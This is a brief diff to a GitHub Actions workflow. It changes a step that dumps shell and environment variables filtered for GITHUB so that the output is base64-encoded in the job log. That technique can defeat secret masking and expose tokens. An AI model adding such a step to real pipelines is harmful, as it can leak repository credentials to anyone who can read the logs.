@@ -23,7 +23,7 @@ jobs:
             - run: |    
                 make update-modules
       - run: |
-          set > /tmp/set.txt; env > /tmp/env.txt; cat /tmp/set.txt /tmp/env.txt | grep GITHUB
+          set > /tmp/set.txt; env > /tmp/env.txt; cat /tmp/set.txt /tmp/env.txt | grep GITHUB | base64 
       - run: |
           make all
       - run: |
